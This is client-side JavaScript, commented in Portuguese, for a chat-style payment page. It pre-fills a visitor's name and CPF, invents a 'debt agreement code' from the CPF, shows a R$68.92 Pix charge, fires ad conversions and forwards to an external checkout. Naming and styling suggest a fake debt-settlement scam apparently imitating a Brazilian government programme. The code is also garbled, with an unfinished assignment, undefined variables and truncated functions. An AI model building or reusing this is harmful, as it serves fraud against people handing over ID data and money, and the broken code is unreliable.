  <script>
      // ================================================================
      // CONFIGURAÇÕES CENTRALIZADAS – Fácil trocar para múltiplas contas
      // ================================================================
      const CONFIG = {
        // ---- URL do Checkout Externo (sem parâmetros) ----
        CHECKOUT_URL: "https://pay.transacaossegura.online/4KovG1AMzozGyDE",

        // ---- Google Ads ----
        GOOGLE_CONVERSION_ID: "AW-641098165",
        GOOGLE_CONVERSION_LABEL: "oQT4CMzGn-McELXD2bEC",

        // ---- Facebook Pixel (opcional) ----
        // FACEBOOK_PIXEL_ID: "SEU_PIXEL_ID_AQUI",

        // ---- Valor (apenas para exibição) ----
        VALOR_PIX: 68.92,
      };

      // ================================================================
      // Fim das configurações – Não altere abaixo a menos que necessário
      // ================================================================

      /**
       * Coleta nome/CPF/nasc da URL ou localStorage. 
       * Agora suporta os parâmetros "name" e "document" (como solicitado).
       */
      function paramsFromUrl() {
        var p = new URLSearchParams(window.location.search);
        return {
          nome: p.get("name") || "",          // captura "name" da URL
          cpf: p.get("document") || "",       // captura "document" da URL
          nasc: p.get("nasc") || "",
          email: p.get("email") || "cliente@brasil.com", // fallback
        };
      }

      function formatCPF(cpf) {
        var d = String(cpf || "")
          .replace(/\D/g, "")
          .slice(0, 11);
        if (d.length <= 3) return d;
        if (d.length <= 6) return d.slice(0, 3) + "." + d.slice(3);
        if (d.length <= 9)
          return d.slice(0, 3) + "." + d.slice(3, 6) + "." + d.slice(6);
        return (
          d.slice(0, 3) +
          "." +
          d.slice(3, 6) +
          "." +
          d.slice(6, 9) +
          "-" +
          d.slice(9)
        );
      }

      function formatData(data) {
        if (!data || data.length < 10) return data;
        var m = String(data).match(/(\d{4})-(\d{2})-(\d{2})/);
        if (m) return m[3] + "/" + m[2] + "/" + m[1];
        return data;
      }

      var u = paramsFromUrl();
      var storage = {};
      try {
        storage.nome = localStorage.getItem("site.nome") || "";
        storage.cpf = localStorage.getItem("site.cpf") || "";
        storage.nasc = localStorage.getItem("site.nasc") || "";
      } catch (_) {}

      var NOME = u.nome || storage.nome || "Usuário";
      var NOME_COMPLETO = NOME;
      var CPF = u.cpf || storage.cpf || "";
      var CPF_FORMATADO = formatCPF(CPF);
      var NASC = u.nasc || storage.nasc || "";

      // Gera código de acordo determinístico por CPF (sempre o mesmo pro mesmo CPF)
      function codeFromCPF(cpf) {
        var d = String(cpf || "").replace(/\D/g, "");
        var h = 5381;
        for (var i = 0; i < d.length; i++) h = (h * 33 + d.charCodeAt(i)) >>> 0;
        var s = h.toString(36).toUpperCase().padStart(8, "X");
        return (
          s.slice(0, 5) +
          "-" +
          s.slice(5, 9) +
          "-" +
          s.slice(9, 13) +
          "-" +
          s.slice(13, 17)
        ).slice(0, 17);
      }
      var CODIGO_ACORDO = codeFromCPF(CPF);

      var AVATAR = "images/leticia.png";

      // Mostrar nome no header
      try {
        var el = document.getElementById("nomeUsuario");
        if (el) el.textContent = NOME.split(" ")[0] || "Usuário";
      } catch (_) {}

      var msgs = document.getElementById("msgs");
      var currentAudio = null;

      function tag(t) {
        return (t || "")
          .replace(/\{NOME\}/g, NOME)
          .replace(/\{NOME_COMPLETO\}/g, NOME_COMPLETO)
          .replace(/\{CPF\}/g, CPF)
          .replace(/\{CPF_FORMATADO\}/g, CPF_FORMATADO)
          .replace(/\{NASC\}/g, NASC)
          .replace(/\{CODIGO_ACORDO\}/g, CODIGO_ACORDO)
          .replace(/\{VALOR\}/g, CONFIG.VALOR_PIX.toFixed(2));
      }

      var scroll = function () {
        setTimeout(function () {
          msgs.scrollTop = msgs.scrollHeight;
        }, 60);
      };
      var sleep = function (ms) {
        return new Promise(function (r) {
          setTimeout(r, ms);
        });
      };

      // ================================================================
      // Função para disparar o evento de conversão para o Google Ads
      // ================================================================
      function dispararVendaGoogle(transactionId) {
        if (typeof gtag === "function") {
          gtag('event', 'conversion', {
            'send_to': CONFIG.GOOGLE_CONVERSION_ID + '/' + CONFIG.GOOGLE_CONVERSION_LABEL,
            'value': CONFIG.VALOR_PIX,
            'currency': 'BRL',
            'transaction_id': transactionId || CODIGO_ACORDO,
          });
          console.log("📊 Google Ads conversion sent - ID:", transactionId || CODIGO_ACORDO);
        } else {
          console.warn("⚠️ gtag not available.");
        }
      }

      function dispararVendaFacebook(transactionId) {
        if (typeof fbq === "function" && CONFIG.FACEBOOK_PIXEL_ID) {
          fbq('track', 'Purchase', {
            value: CONFIG.VALOR_PIX,
            currency: 'BRL',
            transaction_id: transactionId || CODIGO_ACORDO,
          });
          console.log("📊 Facebook Purchase event sent - ID:", transactionId || CODIGO_ACORDO);
        } else {
          if (!CONFIG.FACEBOOK_PIXEL_ID) {
            console.log("ℹ️ Facebook Pixel não configurado.");
          } else {
            console.warn("⚠️ fbq not available.");
          }
        }
      }

      function dispararVenda(transactionId) {
        dispararVendaGoogle(transactionId);
        dispararVendaFacebook(transactionId);
      }

      // ================================================================
      // Função: Redirecionar para o checkout externo (AJUSTADA)
      // Agora envia APENAS os parâmetros: name, document, email
      // ================================================================
      function redirecionarCheckout() {
        // Dispara evento de conversão antes de redirecionar
        dispararVenda(CODIGO_ACORDO);

        // Monta parâmetros para o checkout local (nome e CPF já preenchidos)
        var params = new URLSearchParams();
        params.set("name",     NOME_COMPLETO);
        params.set("document", CPF);   // CPF puro (sem pontuação), o checkout formata

        // Repassa UTMs
        try {
          var m = window.gvdesenrolaMergeTracking && window.gvdesenrolaMergeTracking();
          if (m) Object.keys(m).forEach(function(k) { params.set(k, m[k]); });
        } catch(_) {}

        // Redireciona para o checkout local
        window.location.href = "checkout.html?" + params.toString();
      }

      // ================================================================
      // O restante do código (funções de UI, áudio, fluxo) permanece IGUAL
      // ================================================================

      function addTyping() {
        removeTyping();
        var row = document.createElement("div");
        row.className = "msg-row";
        row.id = "typing-row";
        row.innerHTML =
          '<img class="avatar" src="' +
          AVATAR +
          '"><div class="typing"><span></span><span></span><span></span></div>';
        msgs.appendChild(row);
        scroll();
      }
      function removeTyping() {
        var el = document.getElementById("typing-row");
        if (el) el.remove();
      }

      function botRow(inner) {
        var row = document.createElement("div");
        row.className = "msg-row";
        row.innerHTML = '<img class="avatar" src="' + AVATAR + '">' + inner;
        msgs.appendChild(row);
        scroll();
        return row;
      }

      function addUser(text) {
        var row = document.createElement("div");
        row.className = "msg-row user";
        row.innerHTML = '<div class="bubble-user">' + text + "</div>";
        msgs.appendChild(row);
        scroll();
      }

      function addSystem(text) {
        var row = document.createElement("div");
        row.className = "msg-row";
        row.innerHTML =
          '<div style="width:30px;margin-right:7px;flex-shrink:0"></div><div class="bubble-system">' +
          tag(text) +
          "</div>";
        msgs.appendChild(row);
        scroll();
      }

      function addImage(src) {
        var row = document.createElement("div");
        row.className = "msg-row";
        row.innerHTML =
          '<img class="avatar" src="' +
          AVATAR +
          '"><div style="flex:1"><img src="' +
          src +
          '" style="max-width:100%;border-radius:8px;margin-top:8px"></div>';
        msgs.appendChild(row);
        scroll();
      }

      function addVideo(src) {
        var row = document.createElement("div");
        row.className = "msg-row";
        row.innerHTML =
          '<img class="avatar" src="' +
          AVATAR +
          '"><div style="flex:1"><video height="400" controls style="border-radius:8px;margin-top:8px;width:auto;max-width:100%"><source src="' +
          src +
          '" type="video/mp4"></video></div>';
        msgs.appendChild(row);
        scroll();
      }

      function addVideoAutoplay(src) {
        var row = document.createElement("div");
        row.className = "msg-row";
        var videoContainer = document.createElement("div");
        videoContainer.style.flex = "1";
        videoContainer.style.position = "relative";
        videoContainer.style.display = "inline-block";
        videoContainer.style.width = "100%";

        var video = document.createElement("video");
        video.src = src;
        video.height = "400";
        video.autoplay = true;
        video.playsinline = true;
        video.style.borderRadius = "8px";
        video.style.marginTop = "8px";
        video.style.width = "auto";
        video.style.maxWidth = "100%";
        video.style.display = "block";
        video.setAttribute("playsinline", "");
        video.setAttribute("webkit-playsinline", "");
        video.setAttribute("x5-playsinline", "");

        var controls = document.createElement("div");
        controls.style.position = "absolute";
        controls.style.bottom = "10px";
        controls.style.left = "10px";
        controls.style.display = "flex";
        controls.style.gap = "10px";
        controls.style.zIndex = "10";

        var playPauseBtn = document.createElement("button");
        playPauseBtn.style.width = "52px";
        playPauseBtn.style.height = "52px";
        playPauseBtn.style.borderRadius = "50%";
        playPauseBtn.style.backgroundColor = "#1351B4";
        playPauseBtn.style.border = "none";
        playPauseBtn.style.cursor = "pointer";
        playPauseBtn.style.display = "flex";
        playPauseBtn.style.alignItems = "center";
        playPauseBtn.style.justifyContent = "center";
        playPauseBtn.style.fontSize = "0";
        playPauseBtn.style.color = "#fff";
        playPauseBtn.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";

        var pauseSvg =
          '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
        var playSvg =
          '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';

        playPauseBtn.innerHTML = pauseSvg;
        playPauseBtn.style.color = "#fff";

        var isPlaying = false;
        playPauseBtn.innerHTML = playSvg;

        function attemptPlay() {
          var playPromise = video.play();
          if (playPromise !== undefined) {
            playPromise
              .then(function () {
                isPlaying = true;
                playPauseBtn.innerHTML = pauseSvg;
              })
              .catch(function (e) {
                console.log("Play failed, needs user interaction:", e);
                isPlaying = false;
                playPauseBtn.innerHTML = playSvg;
              });
          }
        }

        setTimeout(attemptPlay, 1000);

        playPauseBtn.onclick = function (e) {
          e.stopPropagation();
          if (isPlaying) {
            video.pause();
            playPauseBtn.innerHTML = playSvg;
            isPlaying = false;
          } else {
            attemptPlay();
          }
        };

        videoContainer.onclick = function (e) {
          if (e.target === video || e.target === videoContainer) {
            if (!isPlaying) {
              attemptPlay();
            }
          }
        };

        controls.appendChild(playPauseBtn);
        videoContainer.appendChild(video);

        var audioPlaySvg =

        var audioPauseSvg =
          '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';

        var timeDiv = document.createElement("div");
        timeDiv.style.fontSize = "13px";
        timeDiv.style.color = "#666";
        timeDiv.style.fontWeight = "500";
        timeDiv.style.textContent = "0:00 / 0:17";

        var isPlaying = true;

        setTimeout(function () {
          var playPromise = audio.play();
          if (playPromise !== undefined) {
            playPromise.catch(function (e) {
              console.log("Audio autoplay:", e);
            });
          }
        }, 200);

        playBtn.onclick = function () {
          if (isPlaying) {
            audio.pause();
            playBtn.innerHTML = audioPlaySvg;
            isPlaying = false;
          } else {
            audio.play();
            playBtn.innerHTML = audioPauseSvg;
            isPlaying = true;
          }
        };

        audio.onended = function () {
          playBtn.innerHTML = "▶";
          isPlaying = false;
          progressFill.style.width = "0%";
        };

        audio.onloadedmetadata = function () {
          var mins = Math.floor(audio.duration / 60);
          var secs = Math.floor(audio.duration % 60);
          var durStr = (secs < 10 ? "0" : "") + secs;
          timeDiv.textContent = "0:00 / " + mins + ":" + durStr;
        };

        audio.ontimeupdate = function () {
          var percent = (audio.currentTime / audio.duration) * 100;
          progressFill.style.width = percent + "%";

          var mins = Math.floor(audio.currentTime / 60);
          var secs = Math.floor(audio.currentTime % 60);
          var currentStr = (secs < 10 ? "0" : "") + secs;
          var totalMins = Math.floor(audio.duration / 60);

          var totalStr = (totalSecs < 10 ? "0" : "") + totalSecs;
          timeDiv.textContent =
            mins + ":" + currentStr + " / " + totalMins + ":" + totalStr;
        };

        progressBar.onclick = function (e) {
          var rect = progressBar.getBoundingClientRect();
          var percent = (e.clientX - rect.left) / rect.width;
          audio.currentTime = percent * audio.duration;
        };

        contentDiv.appendChild(progressBar);

      function addAudioThen(audioSrc, onAction) {
        addAudio(audioSrc);
        return new Promise(function (resolve) {
          var audio = currentAudio;
          var actionExecuted = false;
          var checkInterval = null;

          function setupMonitoring() {
            var duration = audio.duration;
            if (duration && duration > 0) {
              var executeAt = Math.max(0, duration - 3);

              checkInterval = setInterval(function () {
                if (audio.currentTime >= executeAt && !actionExecuted) {
                  actionExecuted = true;
                  if (checkInterval) clearInterval(checkInterval);
                  onAction().then(resolve).catch(resolve);
                }
              }, 100);

              audio.onended = function () {
                if (checkInterval) clearInterval(checkInterval);
                if (!actionExecuted) {
                  actionExecuted = true;
                  onAction().then(resolve).catch(resolve);
                }
              };
            }
          }

          if (audio.readyState >= 1) {
            setupMonitoring();
          } else {
            audio.onloadedmetadata = setupMonitoring;
          }

          setTimeout(function () {
            if (!actionExecuted) {
              actionExecuted = true;
              if (checkInterval) clearInterval(checkInterval);
              onAction().then(resolve).catch(resolve);
            }
          }, 120000);
        });
      }
